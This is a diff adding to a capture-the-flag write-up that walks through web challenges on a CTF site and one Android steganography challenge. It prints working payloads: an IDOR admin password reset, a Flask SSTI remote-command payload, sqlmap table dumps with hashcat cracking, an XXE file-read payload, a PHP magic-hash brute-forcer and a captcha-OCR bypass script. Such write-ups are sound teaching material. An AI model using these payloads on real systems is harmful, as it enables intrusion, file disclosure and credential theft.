@@ -452,3 +452,159 @@ I wondered, what is the purpose of the string `rCpOr6eRlLDWW0pfAeQV/`. The slash
 
 <img src="https://github.com/0xSh4dy/infosec_writeups/blob/images/lit1.png">
   </section>
+
+Now, let's move on to web challenges.
+
+## Challenge15: TheGoodOldDays
+So, on visiting the site, we got something interesting: `Wrong Information, Our Community Members use Old Windows Laptops. You are using a New Linux`. Immediately, I understood that this challenge is related to User Agents. After that, on changing Sec-Ch-Ua-Platform: "Linux" to Sec-Ch-Ua-Platform: "Windows", we get `Wrong Information, Our Community Members use Old Windows Laptops. You are using a New Windows`. I googled stuff and found out a site, https://networking.ringofsaturn.com/Web/useragents.php. From there, I set the user agent as `Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)` and got the flag.
+
+## Challenge16: UnChangeablePasswords
+So, first of all, create a new account. Since, the challenge name is Unchangeable Password, there must be some vulnerability in changing the password. So, on opening the url for the Change Password page, i.e https://web.ctf.devclub.in/web/2/reset.php, we get an input box for entering a new password. Turn on the proxy, change password. You'll notice that the request captured using burp suite contains `user_id=ash&pass=aaaa` which means that we have a client side control on `user_id` . After that, use the user_id as admin to change the admin password. After that, login as admin with the password set by you to get the flag. `CTF{Pr311y_bas1c_1D0R}`
+<img src="https://github.com/0xSh4dy/infosec_writeups/blob/images/unchangeable_passwords.png">
+
+## Challenge17: FlagAuction
+So, the title of the challenge page was `Python Flask Simple Shopping Cart` . Hmm, `Python Flask`, interesting! Idk why my mind says , `Try SSTI` whenever I see Flask. So, I noticed the request for buying a smartphone: it was https://web.ctf.devclub.in/web/4/buy/Smartphone. I used burp and replaced Smartphone with `{{7*'7'}}` in order to test the SSTI payload. And yeah, it executed successfully. See the following image for the actual request sent using BurpSuite.
+After that, I replaced {{7*'7'}} with `{{namespace.__init__.__globals__.os.popen('id').read()}}` and got the following result:
+```
+HTTP/2 200 OK
+Date: Mon, 09 May 2022 10:36:15 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 79
+Server: nginx/1.20.2
+Refresh: 2; url=../
+
+Trying to Buy <b>uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
+</b>  Please Wait
+```
+This is a definite RCE. Now, we need to find the flag file. I used a recursive grep on the word `CTF`, on all the directories present in `/` and found out the flag, which was present in the `/srv` directory. Final payload ->
+`/web/4/buy/{{namespace.__init__.__globals__.os.popen('grep%20-r%20/srv%20-e%20CTF').read()}}`. %20 is used to add the extra space (since we are sending our payload through a GET request).
+
+
+## Challenge18: The Sequel
+As the name says (our beloved Sequel:p), this was an SQL Injection challenge. Btw I'm a hard worker whenever I solve pwn challenges but I'm lazy with web. So, I used SQLMap. I used `sqlmap -u "https://web.ctf.devclub.in/web/1/login.php" --dbms=MySQL --tables --forms`  to dump the table and the database name. After sometime, SQLmap did its job and dumped the information_schema and the database name for me. 
+<img src="https://github.com/0xSh4dy/infosec_writeups/blob/images/sqlmap_i1.png">
+
+<img src="https://github.com/0xSh4dy/infosec_writeups/blob/images/sqlmap_i2.png">
+
+
+After knowing the table database and the table name, I used SQLmap as `sqlmap -u "https://web.ctf.devclub.in/web/1/login.php" --dbms=MySQL --tables --forms -D web1_db -T tbl_users --dump`. This command is used to dump data out of the specified table, if it exists. Finally, I got the result. 
+<img src="https://github.com/0xSh4dy/infosec_writeups/blob/images/sqlmap_i3.png">
+
+After that, I used hashcat to crack the password hash using
+```
+hashcat -m 0 -a 0 386b8fe06ad1d01e027de7270f48822d  /home/rakshit/InfoSec/Misc/Wordlists/rockyou.txt --show 
+```
+<>
+and yo babe, I got the password `wildspirit`
+After that, I logged in using the username `as1605` and the password `wildspirit` and got the flag.
+
+
+## Challenge19: CipherText
+So, there was an input textarea in this challenge which basically applies ROT13 on our input and then renders it. I discovered that this site was vulnerable to XSS but couldn't get anything of it. After striking my head several times on the wall out of frustration (while finding the vulnerability in this challenge), I changed the Content-Type to application/xml 
+```
+Content-Type: application/xml
+```
+and it gave intresting results. 
+
+
+So, I realised that this challenge is related to XXE (XML External Entity). I used the regular payload used for XXE challenges:
+```
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY redacted SYSTEM 'file:///flag.txt'>]><shady><text>&redacted;</text></shady>
+```
+Luckily, the flag was also stored in flag.txt . Thus, I got the flag
+
+
+## Challenge20: Scientific Hashes
+This challenge just asks for a password. The word `PHosPhorous`  says that this challenge is related to PHP. Hint1 states that `Hint 1 : You seriously need to get some NaCl !!!` NaCl is common salt, so it is clear that we have to do something with the password and a salt. Now, a suggestion given to me by an American Security enthusiast girl helped -> Always use BurpSuite while solving CTF challenges related to Web Exploitation. So, I sent a request to enter the password using burp and found out an interesting thing
+```
+Set-Cookie: Salt=f789bbc328a3d1a3; expires=Mon, 09-May-2022 
+```
+Thus, we got the salt. According to my experience, one common thing encountered while solving PHP related challenges having a password is Loose Comparison (using ==). Things starting with 0e equate to 0. So, I copied a script from a past CTF challenge , appended a value to the salt and computed the hash which starts with 0e
+```
+#!/usr/bin/env python
+import hashlib
+import re
+
+prefix = '0e'
+
+
+def breakit():
+    iters = 0
+    while 1:
+        s = "f789bbc328a3d1a3"+str(iters)
+        hashed_s = hashlib.md5(s).hexdigest()
+        iters = iters + 1
+        r = re.match('^0e[0-9]{30}', hashed_s)
+        if r:
+            print "[+] found! md5( {} ) ---> {}".format(s, hashed_s)
+            print "[+] in {} iterations".format(iters)
+            exit(0)
+
+        if iters % 1000000 == 0:
+            print "[+] current value: {}       {} iterations, continue...".format(s, iters)
+
+breakit()
+```
+<img src="https://github.com/0xSh4dy/infosec_writeups/blob/images/s_hash.png">
+
+## Challenge21: CaptchaTheFlag
+So, the challenge page containes a Captcha with some string in it. Every time you reload the page, the captcha changes. I was kinda happy cause one month ago, I tried a similar challenge named `ReReCaptcha` in UTCTF. So, I read one of the writeups https://ubcctf.github.io/2022/03/utctf-rerecaptcha/ , and modified the script to 
+
+```
+import time
+import requests, io, hashlib
+import base64
+from PIL import Image
+import cv2
+import pytesseract
+
+
+CAPT = set()
+
+URL = "https://web.ctf.devclub.in/dev/4/"
+
+
+def save(byts, i):
+    stream = io.BytesIO(byts)
+    img = Image.open(stream)
+    # print("aaaa.png")   
+    img.save("aaaa.png")
+    captcha = Image.open("aaaa.png")
+    img = cv2.imread('aaaa.png')
+    config = ('-l eng --oem 1 --psm 3')
+    text = pytesseract.image_to_string(img, config=config)
+    text = text.split('\n')
+    txt = text[0]
+    print(txt)
+    r = requests.post(URL,data={"captcha":txt}).text
+    print(r)
+
+def fetchImage(i):
+    r = requests.get(URL)
+    content = r.content
+    soup = BeautifulSoup(content, 'lxml')
+    tag = soup.find('img')
+    byts = base64.b64decode(
+        tag['src'][len('data:image/png;base64, '):])
+    hash = hashlib.md5(byts).hexdigest()
+    CAPT.add(hash)
+    save(byts, i)
+
+fetchImage(0)
+```
+This script basically extracts the text out of the captcha and POSTs it . Finally, on running the script I got the flag 
+`devctf{0k@y!_y0u_@re_@_hum@n}`
+
+
+## Challenge22: Bonjour
+This was an Android Reverse Engineering Challenge. But, I was kinda sad when I tried to view the source code using JADX but there was nothing good. The package name used here was `ctf.stagno`. I thought maybe this challenge would be related to steganography. After that, I used apktool to unpack the apk and viewed strings.xml as usual. One of the strings was quite interesting: 
+```
+<string name="zip">i_am_not_the_flag_but_i_will_help_you</string>
+```
+I thought maybe we have to find a zip file and unlock it using the passphrase above. For that, I unzipped the apk
+```
+unzip bonjour.apk
+```
+I changed the directory to res and found out that a lot of images were present there. Initially, I targeted the jpg images cause they were lesser in number.  On using binwalk on the image `Sl.jpg`, I found out that a zip file was embedded in this image. Unzipping this password protected zip file using the password `i_am_not_the_flag_but_i_will_help_you`, we get the file flag.txt 
+
+<img src="https://github.com/0xSh4dy/infosec_writeups/blob/images/bonjour.png">
